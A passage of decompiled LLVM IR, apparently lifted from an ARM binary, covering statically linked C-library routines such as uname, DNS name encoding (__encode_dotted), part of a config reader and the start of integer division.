  %v4_1d324 = call i32 @inet_pton(i32 10, i8* %v3_1d324, i32 %v0_1d320)
  %tmp24 = icmp slt i32 %v4_1d324, 1
  br i1 %tmp24, label %dec_label_pc_1d34c, label %dec_label_pc_1d330

dec_label_pc_1d330:                               ; preds = %dec_label_pc_1d314
  store i32 %tmp7, i32* @ip, align 4
  %v0_1d334 = load i32, i32* @r8, align 4
  %v1_1d334 = load i32, i32* @r7, align 4
  %v2_1d334 = add i32 %v1_1d334, 8
  %v3_1d334 = inttoptr i32 %v2_1d334 to i32*
  store i32 %v0_1d334, i32* %v3_1d334, align 4
  %v0_1d338 = load i32, i32* @r7, align 4
  %v1_1d338 = load i32, i32* @ip, align 4
  %v2_1d338 = inttoptr i32 %v1_1d338 to i32*
  store i32 %v0_1d338, i32* %v2_1d338, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d340

dec_label_pc_1d340:                               ; preds = %dec_label_pc_1d2f8, %dec_label_pc_1d330
  %v0_1d344 = phi i32 [ %v0_1d344.pre, %dec_label_pc_1d2f8 ], [ 16, %dec_label_pc_1d330 ]
  store i32 0, i32* @sb, align 4
  %v1_1d344 = load i32, i32* @r7, align 4
  %v2_1d344 = add i32 %v1_1d344, 12
  %v3_1d344 = inttoptr i32 %v2_1d344 to i32*
  store i32 %v0_1d344, i32* %v3_1d344, align 4
  br label %dec_label_pc_1d374

dec_label_pc_1d34c:                               ; preds = %dec_label_pc_1d30c, %dec_label_pc_1d314, %dec_label_pc_1d2dc
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1d350

dec_label_pc_1d350:                               ; preds = %dec_label_pc_1d298.preheader, %dec_label_pc_1d28c.dec_label_pc_1d298_crit_edge, %dec_label_pc_1d274, %dec_label_pc_1d34c, %dec_label_pc_1d204
  %v0_1d350 = load i32, i32* @r6, align 4
  store i32 %v2_1d20c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1d240, i32* %r3.global-to-local, align 4
  %v4_1d360 = inttoptr i32 %v0_1d350 to i32*
  %v5_1d360 = call i32 @__GI_config_read(i32* %v4_1d360, i32 %v2_1d20c, i32 459270, i32 %v0_1d240)
  %v2_1d364 = icmp eq i32 %v5_1d360, 0
  br i1 %v2_1d364, label %dec_label_pc_1d36c, label %dec_label_pc_1d254

dec_label_pc_1d36c:                               ; preds = %dec_label_pc_1d350
  %v0_1d36c = load i32, i32* @fp, align 4
  %v7_1d36c = icmp eq i32 %v0_1d36c, 1
  br i1 %v7_1d36c, label %dec_label_pc_1d37c, label %dec_label_pc_1d374

dec_label_pc_1d374:                               ; preds = %dec_label_pc_1d36c, %dec_label_pc_1d340
  %v0_1d374 = load i32, i32* @r6, align 4
  %v1_1d378 = inttoptr i32 %v0_1d374 to i32*
  %v2_1d378 = call i32 @__GI_config_close(i32* %v1_1d378)
  br label %dec_label_pc_1d37c

dec_label_pc_1d37c:                               ; preds = %dec_label_pc_1d254, %.thread, %dec_label_pc_1d36c, %dec_label_pc_1d1f0, %dec_label_pc_1d374
  %v0_1d37c = load i32, i32* @sb, align 4
  store i32 %v3_1d194, i32* @r4, align 4
  store i32 %v6_1d194, i32* @r5, align 4
  store i32 %v9_1d194, i32* @r6, align 4
  store i32 %v12_1d194, i32* @r7, align 4
  store i32 %v15_1d194, i32* @r8, align 4
  store i32 %v18_1d194, i32* @sb, align 4
  store i32 %v21_1d194, i32* @sl, align 4
  store i32 %v24_1d194, i32* @fp, align 4
  ret i32 %v0_1d37c

; uselistorder directives
  uselistorder i32 %v2_1d298, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1d298.pre, { 1, 0 }
  uselistorder i32 %v0_1d240, { 1, 0 }
  uselistorder i32 %v2_1d20c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 38, 40, 41, 10, 45, 48, 49, 50, 28, 29, 12, 11, 4, 52, 51, 42, 13, 53, 14, 54, 15, 55, 56, 1, 30, 16, 31, 17, 18, 19, 39, 8, 0, 43, 44, 20, 59, 46, 47, 32, 33, 21, 34, 22, 9, 35, 36, 37, 7, 6, 2, 57, 58, 23, 5, 25, 26, 24, 27, 60 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 24, { 64, 68, 70, 71, 0, 82, 13, 18, 1, 54, 72, 73, 40, 41, 42, 43, 19, 69, 83, 2, 76, 77, 78, 20, 65, 66, 55, 21, 67, 22, 44, 45, 23, 46, 24, 25, 26, 3, 27, 28, 29, 30, 74, 75, 14, 31, 4, 79, 32, 33, 34, 36, 35, 37, 5, 6, 7, 56, 57, 58, 59, 60, 61, 62, 63, 47, 80, 38, 81, 39, 48, 49, 50, 51, 52, 53, 15, 16, 10, 9, 17, 8, 11, 12, 84, 85 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 38, 24, 6, 35, 36, 25, 26, 27, 28, 0, 1, 30, 7, 31, 32, 2, 8, 33, 9, 40, 10, 41, 42, 43, 11, 13, 12, 14, 37, 3, 15, 34, 16, 18, 29, 17, 19, 20, 21, 39, 22, 23, 4 }
  uselistorder i32 34, { 8, 9, 10, 11, 2, 3, 0, 5, 13, 4, 14, 7, 1, 12, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2947c.811 to i32), { 98, 70, 71, 72, 99, 3, 4, 73, 100, 1, 101, 102, 103, 104, 105, 106, 74, 75, 107, 108, 26, 109, 9, 11, 6, 7, 10, 5, 8, 110, 12, 76, 111, 112, 113, 13, 77, 114, 115, 29, 27, 28, 14, 15, 116, 16, 117, 17, 118, 18, 119, 78, 120, 79, 121, 19, 20, 122, 80, 123, 124, 125, 126, 127, 128, 39, 38, 40, 129, 30, 64, 60, 58, 57, 59, 61, 62, 63, 56, 65, 51, 53, 52, 50, 49, 54, 55, 46, 45, 48, 47, 44, 43, 42, 41, 82, 66, 81, 67, 68, 83, 130, 2, 85, 84, 86, 21, 131, 22, 87, 88, 132, 90, 133, 134, 135, 136, 23, 137, 92, 91, 37, 34, 35, 36, 33, 24, 69, 32, 89, 93, 138, 94, 139, 25, 140, 141, 31, 142, 95, 143, 0, 96, 97 }
  uselistorder i32* @fp, { 34, 35, 36, 37, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0, 60, 70, 71, 72, 73, 74, 75, 76, 77, 78, 4, 5, 79, 80, 1, 81, 82, 83, 84, 38, 39, 40, 41, 42, 43, 44, 45, 2, 56, 57, 58, 59, 130, 132, 131, 133, 114, 115, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 61, 62, 63, 64, 65, 66, 67, 68, 69, 6, 7, 8, 9, 10, 11, 12, 13, 14, 28, 29, 30, 31, 32, 33, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 134, 135, 136, 137, 138, 139, 140, 147, 148, 146, 141, 142, 143, 144, 145, 3 }
  uselistorder i32* @sl, { 29, 30, 31, 32, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 54, 55, 56, 57, 58, 0, 59, 1, 60, 61, 62, 63, 64, 65, 66, 67, 68, 8, 9, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 33, 34, 35, 36, 37, 5, 6, 10, 11, 48, 49, 50, 51, 52, 53, 83, 84, 85, 2, 86, 87, 88, 89, 90, 91, 93, 3, 92, 95, 94, 96, 97, 98, 99, 79, 80, 81, 82, 12, 13, 14, 15, 16, 17, 18, 4, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 7 }
  uselistorder i32* @sb, { 16, 17, 18, 19, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 2, 33, 70, 71, 3, 72, 73, 74, 75, 76, 77, 78, 5, 6, 7, 79, 80, 81, 82, 83, 84, 85, 20, 21, 22, 23, 34, 35, 36, 37, 38, 39, 40, 41, 88, 91, 89, 90, 92, 86, 87, 8, 9, 10, 11, 12, 13, 14, 0, 15, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 4 }
  uselistorder i32* @r8, { 39, 40, 41, 42, 43, 44, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 62, 68, 71, 72, 73, 74, 75, 76, 3, 77, 78, 79, 80, 81, 82, 14, 15, 16, 83, 84, 85, 86, 87, 88, 89, 90, 91, 45, 46, 47, 48, 17, 18, 19, 8, 9, 4, 10, 63, 64, 5, 65, 66, 67, 94, 95, 96, 97, 98, 6, 99, 100, 101, 102, 103, 104, 105, 106, 92, 93, 69, 70, 20, 21, 0, 22, 29, 30, 31, 32, 33, 34, 2, 35, 1, 36, 37, 38, 11, 12, 60, 61, 23, 24, 25, 26, 27, 28, 7, 13 }
  uselistorder label %dec_label_pc_1d37c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1d350, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1d34c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d340, { 1, 0 }
  uselistorder label %dec_label_pc_1d28c, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1d398 = load i32, i32* @r7, align 4
  store i32 %v3_1d398, i32* %stack_var_-8, align 4
  %v0_1d3a4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d3a4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1d3a4, -4095
  br i1 %tmp, label %dec_label_pc_1d3c4, label %dec_label_pc_1d3b4

dec_label_pc_1d3b4:                               ; preds = %entry
  %v0_1d3b4 = call i32 @__GI___errno_location()
  %v0_1d3b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d3b8 = sub i32 0, %v0_1d3b8
  %v2_1d3bc = inttoptr i32 %v0_1d3b4 to i32*
  store i32 %v1_1d3b8, i32* %v2_1d3bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1d3c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1d3c4

dec_label_pc_1d3c4:                               ; preds = %entry, %dec_label_pc_1d3b4
  %v1_1d3c8 = phi i32 [ %v0_1d3a4, %entry ], [ -1, %dec_label_pc_1d3b4 ]
  %v2_1d3c4 = phi i32 [ %v3_1d398, %entry ], [ %v2_1d3c4.pre, %dec_label_pc_1d3b4 ]
  store i32 %v2_1d3c4, i32* @r7, align 4
  ret i32 %v1_1d3c8

; uselistorder directives
  uselistorder i32 %v0_1d3a4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 49, 48, 60, 46, 45, 44, 43, 84, 83, 82, 34, 38, 59, 58, 81, 80, 77, 47, 33, 57, 56, 79, 78, 76, 75, 74, 73, 5, 40, 51, 17, 9, 72, 8, 22, 7, 16, 15, 14, 42, 41, 71, 70, 69, 39, 13, 12, 52, 21, 32, 31, 50, 11, 25, 28, 61, 27, 55, 54, 53, 68, 36, 35, 6, 2, 4, 37, 66, 10, 67, 0, 30, 3, 23, 65, 24, 29, 64, 63, 62, 19, 1, 18, 85, 26, 20 }
  uselistorder i32* @r7, { 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 151, 152, 153, 154, 155, 156, 157, 158, 165, 166, 167, 168, 169, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 21, 22, 23, 24, 0, 25, 2, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 76, 4, 77, 78, 79, 26, 27, 28, 29, 30, 31, 32, 33, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 80, 1, 81, 82, 83, 84, 5, 170, 171, 120, 6, 121, 122, 123, 124, 125, 126, 34, 35, 40, 41, 42, 43, 36, 37, 38, 39, 44, 45, 46, 47, 272, 273, 104, 105, 242, 243, 232, 233, 48, 234, 230, 231, 274, 275, 276, 277, 282, 283, 7, 16, 17, 49, 50, 3, 51, 15, 52, 53, 244, 245, 250, 251, 252, 253, 254, 255, 256, 246, 247, 248, 249, 159, 160, 161, 162, 163, 164, 257, 258, 259, 260, 261, 262, 263, 264, 8, 265, 266, 267, 217, 218, 268, 269, 226, 227, 68, 69, 221, 222, 223, 9, 224, 225, 85, 86, 87, 88, 89, 90, 91, 10, 177, 178, 172, 11, 173, 174, 175, 14, 176, 54, 12, 55, 56, 179, 13, 180, 181, 92, 93, 98, 99, 18, 19, 94, 95, 96, 97, 100, 101, 102, 103, 148, 149, 150, 235, 236, 280, 281, 57, 58, 270, 271, 106, 107, 278, 279, 228, 229, 59, 60, 219, 220, 61, 62, 63, 64, 65, 66, 67, 237, 238, 239, 240, 241, 70, 71, 72, 73, 74, 75, 20 }
  uselistorder label %dec_label_pc_1d3c4, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1d3cc = load i32, i32* @r4, align 4
  store i32 %v3_1d3cc, i32* %stack_var_-32, align 4
  %v6_1d3cc = load i32, i32* @r5, align 4
  %v9_1d3cc = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1d3d4 = load i32, i32* @r1, align 4
  store i32 %v0_1d3d4, i32* %r8.global-to-local, align 4
  %v0_1d3d8 = load i32, i32* @r2, align 4
  store i32 %v0_1d3d8, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d44023 = icmp slt i8* %arg1, null
  store i1 %v1_1d44023, i1* %cpsr_n.global-to-local, align 1
  %v2_1d44024 = icmp eq i8* %arg1, null
  store i1 %v2_1d44024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d44024, label %dec_label_pc_1d458, label %dec_label_pc_1d44c

dec_label_pc_1d3e4:                               ; preds = %dec_label_pc_1d44c
  %v2_1d3e4 = call i32 @__GI_strchr(i32 %v0_1d3e426, i32 46)
  store i32 %v2_1d3e4, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d3e8 = icmp slt i32 %v2_1d3e4, 0
  store i1 %v1_1d3e8, i1* %cpsr_n.global-to-local, align 1
  %v2_1d3e8 = icmp eq i32 %v2_1d3e4, 0
  store i1 %v2_1d3e8, i1* %cpsr_z.global-to-local, align 1
  %v0_1d3ec = load i32, i32* @r4, align 4
  %v2_1d3ec = sub i32 %v2_1d3e4, %v0_1d3ec
  store i32 %v2_1d3ec, i32* @r5, align 4
  br i1 %v2_1d3e8, label %dec_label_pc_1d3f4, label %dec_label_pc_1d400

dec_label_pc_1d3f4:                               ; preds = %dec_label_pc_1d3e4
  %v1_1d3f4 = inttoptr i32 %v0_1d3ec to i8*
  %v3_1d3f8 = call i32 @strlen(i8* %v1_1d3f4)
  %sext = mul i32 %v3_1d3f8, 16777216
  %v1_1d3fc = sdiv i32 %sext, 16777216
  store i32 %v1_1d3fc, i32* @r5, align 4
  %v0_1d40c.pre = load i32, i32* @r4, align 4
  %v0_1d41c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1d400

dec_label_pc_1d400:                               ; preds = %dec_label_pc_1d3e4, %dec_label_pc_1d3f4
  %v0_1d41c = phi i32 [ %v2_1d3e4, %dec_label_pc_1d3e4 ], [ %v0_1d41c.pre, %dec_label_pc_1d3f4 ]
  %v0_1d40c = phi i32 [ %v0_1d3ec, %dec_label_pc_1d3e4 ], [ %v0_1d40c.pre, %dec_label_pc_1d3f4 ]
  %v0_1d42c = phi i32 [ %v2_1d3ec, %dec_label_pc_1d3e4 ], [ %v1_1d3fc, %dec_label_pc_1d3f4 ]
  %v0_1d400 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d400 = add i32 %v0_1d400, 1
  store i32 %v1_1d400, i32* %r7.global-to-local, align 4
  %v1_1d404 = load i32, i32* %sb.global-to-local, align 4
  %v2_1d404 = sub i32 %v1_1d404, %v0_1d400
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d408 = icmp slt i32 %v0_1d42c, 0
  store i1 %v1_1d408, i1* %cpsr_n.global-to-local, align 1
  %v2_1d408 = icmp eq i32 %v0_1d42c, 0
  store i1 %v2_1d408, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1d40c, i32* @r1, align 4
  %v0_1d410 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d410 = add i32 %v0_1d410, %v1_1d400
  store i32 %v2_1d410, i32* @r0, align 4
  store i32 %v0_1d42c, i32* @r2, align 4
  %v1_1d418 = add i32 %v2_1d404, -1
  store i32 %v1_1d418, i32* @r3, align 4
  %v1_1d41c = add i32 %v0_1d41c, 1
  store i32 %v1_1d41c, i32* @r4, align 4
  br i1 %v2_1d408, label %dec_label_pc_1d46c, label %dec_label_pc_1d424

dec_label_pc_1d424:                               ; preds = %dec_label_pc_1d400
  %v2_1d424 = sub i32 %v0_1d42c, %v1_1d418
  %v3_1d424 = icmp ult i32 %v0_1d42c, %v1_1d418
  %v4_1d424 = xor i32 %v1_1d418, %v0_1d42c
  %v5_1d424 = xor i32 %v2_1d424, %v0_1d42c
  %v6_1d424 = and i32 %v5_1d424, %v4_1d424
  %v7_1d424 = icmp slt i32 %v6_1d424, 0
  store i1 %v7_1d424, i1* %cpsr_v.global-to-local, align 1
  %v8_1d424 = icmp slt i32 %v2_1d424, 0
  store i1 %v8_1d424, i1* %cpsr_n.global-to-local, align 1
  %v9_1d424 = icmp eq i32 %v0_1d42c, %v1_1d418
  store i1 %v9_1d424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1d424, label %dec_label_pc_1d42c, label %dec_label_pc_1d46c

dec_label_pc_1d42c:                               ; preds = %dec_label_pc_1d424
  %v1_1d42c = trunc i32 %v0_1d42c to i8
  %v4_1d42c = add i32 %v0_1d410, %v0_1d400
  %v5_1d42c = inttoptr i32 %v4_1d42c to i8*
  store i8 %v1_1d42c, i8* %v5_1d42c, align 1
  %v0_1d430 = call i32 @memcpy()
  store i32 %v0_1d430, i32* @r0, align 4
  %v0_1d434 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d434 = icmp slt i32 %v0_1d434, 0
  store i1 %v1_1d434, i1* %cpsr_n.global-to-local, align 1
  %v2_1d434 = icmp eq i32 %v0_1d434, 0
  store i1 %v2_1d434, i1* %cpsr_z.global-to-local, align 1
  %v0_1d438 = load i32, i32* @r5, align 4
  %v1_1d438 = load i32, i32* %r7.global-to-local, align 4
  %v2_1d438 = add i32 %v1_1d438, %v0_1d438
  store i32 %v2_1d438, i32* %sl.global-to-local, align 4
  br i1 %v2_1d434, label %dec_label_pc_1d458, label %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge

dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge:  ; preds = %dec_label_pc_1d42c
  %v0_1d440.pre = load i32, i32* @r4, align 4
  store i32 %v0_1d440.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d440 = icmp slt i32 %v0_1d440.pre, 0
  store i1 %v1_1d440, i1* %cpsr_n.global-to-local, align 1
  %v2_1d440 = icmp eq i32 %v0_1d440.pre, 0
  store i1 %v2_1d440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d440, label %dec_label_pc_1d458, label %dec_label_pc_1d44c

dec_label_pc_1d44c:                               ; preds = %entry, %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge
  %v0_1d3e426 = phi i32 [ %v0_1d440.pre, %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge ], [ %tmp, %entry ]
  %v5_1d460525 = phi i32 [ %v2_1d438, %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge ], [ 0, %entry ]
  %v1_1d44c = inttoptr i32 %v0_1d3e426 to i8*
  %v2_1d44c = load i8, i8* %v1_1d44c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d450 = icmp eq i8 %v2_1d44c, 0
  store i1 %v2_1d450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d450, label %dec_label_pc_1d458, label %dec_label_pc_1d3e4

dec_label_pc_1d458:                               ; preds = %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge, %dec_label_pc_1d42c, %dec_label_pc_1d44c, %entry
  %v8_1d464 = phi i32 [ 0, %entry ], [ %v5_1d460525, %dec_label_pc_1d44c ], [ %v2_1d438, %dec_label_pc_1d42c ], [ %v2_1d438, %dec_label_pc_1d42c.dec_label_pc_1d440_crit_edge ]
  %v0_1d458 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d458 = icmp slt i32 %v0_1d458, 0
  store i1 %v1_1d458, i1* %cpsr_n.global-to-local, align 1
  %v2_1d458 = icmp eq i32 %v0_1d458, 0
  store i1 %v2_1d458, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1d458, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1d458
  %v6_1d460 = add i32 %v8_1d464, 1
  store i32 %v6_1d460, i32* @r0, align 4
  %v7_1d464 = load i32, i32* %r8.global-to-local, align 4
  %v9_1d464 = add i32 %v7_1d464, %v8_1d464
  %v10_1d464 = inttoptr i32 %v9_1d464 to i8*
  store i8 0, i8* %v10_1d464, align 1
  %v0_1d468.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1d468.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1d468.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1d458, %bb
  %v2_1d468 = phi i1 [ %v2_1d468.pre, %bb ], [ false, %dec_label_pc_1d458 ]
  %v1_1d468 = phi i1 [ %v1_1d468.pre, %bb ], [ %v1_1d458, %dec_label_pc_1d458 ]
  %v0_1d468 = phi i1 [ %v0_1d468.pre, %bb ], [ %v2_1d458, %dec_label_pc_1d458 ]
  %v3_1d468 = xor i1 %v2_1d468, %v1_1d468
  %v4_1d468 = or i1 %v0_1d468, %v3_1d468
  br i1 %v4_1d468, label %dec_label_pc_1d46c, label %.dec_label_pc_1d470_crit_edge

.dec_label_pc_1d470_crit_edge:                    ; preds = %bb22
  %v1_1d474.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1d470

dec_label_pc_1d46c:                               ; preds = %dec_label_pc_1d424, %dec_label_pc_1d400, %bb22
  br label %dec_label_pc_1d470

dec_label_pc_1d470:                               ; preds = %.dec_label_pc_1d470_crit_edge, %dec_label_pc_1d46c
  %v1_1d474 = phi i32 [ %v1_1d474.pre, %.dec_label_pc_1d470_crit_edge ], [ -1, %dec_label_pc_1d46c ]
  %v2_1d470 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1d470, i32* @r4, align 4
  store i32 %v6_1d3cc, i32* @r5, align 4
  store i32 %v9_1d3cc, i32* @r6, align 4
  ret i32 %v1_1d474

; uselistorder directives
  uselistorder i32 %v0_1d458, { 0, 2, 1 }
  uselistorder i32 %v0_1d440.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d434, { 1, 0 }
  uselistorder i32 %v2_1d424, { 1, 0 }
  uselistorder i32 %v1_1d418, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1d42c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1d3fc, { 1, 0 }
  uselistorder i1 %v2_1d44024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 83, 84, 86, 87, 88, 89, 85, 26, 27, 0, 90, 91, 92, 28, 9, 94, 93, 29, 95, 96, 97, 38, 98, 99, 7, 100, 102, 39, 103, 104, 101, 105, 106, 107, 108, 110, 109, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 122, 121, 123, 40, 125, 124, 46, 126, 41, 127, 129, 130, 128, 42, 131, 132, 44, 133, 43, 134, 135, 136, 137 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 10, 9, 8, 7, 6, 5, 25, 4, 12, 24, 23, 0, 14, 13, 22, 21, 20, 11, 19, 18, 1, 3, 2 }
  uselistorder i32 (i8*)* @strlen, { 14, 12, 11, 10, 9, 8, 28, 27, 13, 18, 17, 16, 29, 26, 25, 24, 22, 23, 21, 20, 19, 15, 32, 31, 30, 7, 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 12, 8, 7, 6, 2, 1, 0, 11, 10, 9, 18, 17, 16, 15, 14, 13, 5, 4, 3 }
  uselistorder i32 46, { 0, 1, 4, 5, 6, 7, 9, 8, 2, 3 }
  uselistorder label %dec_label_pc_1d470, { 1, 0 }
  uselistorder label %dec_label_pc_1d46c, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1d458, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1d44c, { 1, 0 }
  uselistorder label %dec_label_pc_1d400, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1d478 = load i32, i32* @r1, align 4
  %v1_1d478 = icmp slt i32 %v0_1d478, 0
  %v2_1d478 = icmp eq i32 %v0_1d478, 0
  %v2_1d47c = xor i32 %v0_1d478, %arg1
  br i1 %v2_1d478, label %dec_label_pc_1d590, label %dec_label_pc_1d484

dec_label_pc_1d484:                               ; preds = %entry
  br i1 %v1_1d478, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1d484
  %v2_1d484 = sub i32 0, %v0_1d478
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1d484, %bb
  %v1_1d550 = phi i32 [ %v2_1d484, %bb ], [ %v0_1d478, %dec_label_pc_1d484 ]
  %v1_1d488 = add i32 %v1_1d550, -1
  %v7_1d488 = icmp eq i32 %v1_1d550, 1
  br i1 %v7_1d488, label %dec_label_pc_1d530, label %dec_label_pc_1d490

dec_label_pc_1d490:                               ; preds = %thread-pre-split
  %v1_1d490 = icmp slt i32 %arg1, 0
  br i1 %v1_1d490, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1d490
  %v2_1d494 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1d490, %bb85
  %v0_1d584 = phi i32 [ %arg1, %dec_label_pc_1d490 ], [ %v2_1d494, %bb85 ]
  %v3_1d498 = icmp uge i32 %v0_1d584, %v1_1d550
  %v9_1d498 = icmp eq i32 %v0_1d584, %v1_1d550
  %v2_1d49c = xor i1 %v3_1d498, true
  %v3_1d49c = or i1 %v9_1d498, %v2_1d49c
  br i1 %v3_1d49c, label %dec_label_pc_1d53c, label %dec_label_pc_1d4a0

dec_label_pc_1d4a0:                               ; preds = %bb86
  %v2_1d4a0 = and i32 %v1_1d488, %v1_1d550
  %v4_1d4a0 = icmp eq i32 %v2_1d4a0, 0
